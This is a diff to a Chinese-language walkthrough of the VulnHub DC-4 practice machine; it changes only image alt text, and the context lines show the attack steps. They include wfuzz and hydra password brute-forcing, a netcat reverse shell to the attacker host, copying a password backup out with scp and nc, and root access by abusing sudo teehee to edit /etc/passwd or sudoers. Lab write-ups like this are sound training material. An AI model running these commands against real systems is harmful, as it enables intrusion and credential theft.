@@ -56,7 +56,7 @@ Installation is simple - download it, unzip it, and then import it into VirtualB
 nmap -sP 192.168.141.0/24
 ```
 
-![image](../../../../../assets/img/安全/实验/VulnHub/DC/DC4/1.png)
+![](../../../../../assets/img/安全/实验/VulnHub/DC/DC4/1.png)
 
 排除法,去掉自己、宿主机、网关, `192.168.141.137` 就是目标了
 
@@ -65,11 +65,11 @@ nmap -sP 192.168.141.0/24
 nmap -T5 -A -v -p- 192.168.141.137
 ```
 
-![image](../../../../../assets/img/安全/实验/VulnHub/DC/DC4/2.png)
+![](../../../../../assets/img/安全/实验/VulnHub/DC/DC4/2.png)
 
 一个 web ,一个 ssh,先看看 web 有什么信息
 
-![image](../../../../../assets/img/安全/实验/VulnHub/DC/DC4/3.png)
+![](../../../../../assets/img/安全/实验/VulnHub/DC/DC4/3.png)
 
 单纯一个登录页面,没有任何其他逻辑功能,比如密码找回、注册
 
@@ -84,7 +84,7 @@ wfuzz -v -w test.txt -d "username=admin&password=FUZZ" --hh 206 -u http://192.16
 
 解释一下，第一句是把 rockyou.txt 前 10000 行单独创建为一个文件 test.txt，源文件太大了足足1000多W行，wfuzz直接无法识别字典。
 
-![image](../../../../../assets/img/安全/实验/VulnHub/DC/DC4/4.png)
+![](../../../../../assets/img/安全/实验/VulnHub/DC/DC4/4.png)
 
 可见,跑出了 payload 也就是密码 `happy`
 
@@ -94,11 +94,11 @@ wfuzz -v -w test.txt -d "username=admin&password=FUZZ" --hh 206 -u http://192.16
 
 直接登录发现存在运行执行代码的功能点
 
-![image](../../../../../assets/img/安全/实验/VulnHub/DC/DC4/5.png)
+![](../../../../../assets/img/安全/实验/VulnHub/DC/DC4/5.png)
 
-![image](../../../../../assets/img/安全/实验/VulnHub/DC/DC4/6.png)
+![](../../../../../assets/img/安全/实验/VulnHub/DC/DC4/6.png)
 
-![image](../../../../../assets/img/安全/实验/VulnHub/DC/DC4/7.png)
+![](../../../../../assets/img/安全/实验/VulnHub/DC/DC4/7.png)
 
 这里可以在 burp 中拦截请求,将 payload 改为我们需要的命令
 
@@ -112,7 +112,7 @@ nc -lvp 4444
 nc -nv 192.168.141.134 4444 -e /bin/bash
 ```
 
-![image](../../../../../assets/img/安全/实验/VulnHub/DC/DC4/8.png)
+![](../../../../../assets/img/安全/实验/VulnHub/DC/DC4/8.png)
 
 此时 kali 以收到弹回的 shell，给他改成方便交互的
 
@@ -121,7 +121,7 @@ python -c 'import pty; pty.spawn("/bin/bash")'
 export TERM=xterm
 ```
 
-![image](../../../../../assets/img/安全/实验/VulnHub/DC/DC4/9.png)
+![](../../../../../assets/img/安全/实验/VulnHub/DC/DC4/9.png)
 
 ---
 
@@ -152,7 +152,7 @@ ls /tmp
 scp /home/jim/backups/old-passwords.bak root@192.168.141.134:/
 ```
 
-![image](../../../../../assets/img/安全/实验/VulnHub/DC/DC4/10.png)
+![](../../../../../assets/img/安全/实验/VulnHub/DC/DC4/10.png)
 
 当然用 nc 也可以直接传
 ```
@@ -165,15 +165,15 @@ nc 192.168.141.134 5555 < /home/jim/backups/old-passwords.bak
 hydra -l jim -P /old-passwords.bak 192.168.141.137 ssh
 ```
 
-![image](../../../../../assets/img/安全/实验/VulnHub/DC/DC4/11.png)
+![](../../../../../assets/img/安全/实验/VulnHub/DC/DC4/11.png)
 
 登录,并查看 mbox 内容
 
-![image](../../../../../assets/img/安全/实验/VulnHub/DC/DC4/12.png)
+![](../../../../../assets/img/安全/实验/VulnHub/DC/DC4/12.png)
 
 看上去像是一份邮件,去 `/var/mail` 看看是否有信息
 
-![image](../../../../../assets/img/安全/实验/VulnHub/DC/DC4/13.png)
+![](../../../../../assets/img/安全/实验/VulnHub/DC/DC4/13.png)
 
 发现一份 charles 给 jim 的信,他要去度假，老板让他把密码给 jim,ok 收获 charles 密码 `^xHhA&hvim0y`
 
@@ -183,7 +183,7 @@ su charles
 sudo -l
 ```
 
-![image](../../../../../assets/img/安全/实验/VulnHub/DC/DC4/14.png)
+![](../../../../../assets/img/安全/实验/VulnHub/DC/DC4/14.png)
 
 Charles 可以使用 sudo 权限运行 teehee。teehee 可以干嘛？可以将标准输入复制到我们选择的文件中。那么我可以直接写一个 root 权限的用户到 /etc/passwd 下，也可以直接在 sudoers 里给 charles 所有权限
 
@@ -194,7 +194,7 @@ Charles 可以使用 sudo 权限运行 teehee。teehee 可以干嘛？可以将�
     whoami
     ```
 
-    ![image](../../../../../assets/img/安全/实验/VulnHub/DC/DC4/15.png)
+    ![](../../../../../assets/img/安全/实验/VulnHub/DC/DC4/15.png)
 
 2. 在 sudoers 里给 charles 所有权限
     ```
@@ -203,6 +203,6 @@ Charles 可以使用 sudo 权限运行 teehee。teehee 可以干嘛？可以将�
     sudo su
     ```
 
-    ![image](../../../../../assets/img/安全/实验/VulnHub/DC/DC4/16.png)
+    ![](../../../../../assets/img/安全/实验/VulnHub/DC/DC4/16.png)
 
 提权成功,感谢靶机作者 @DCUA7
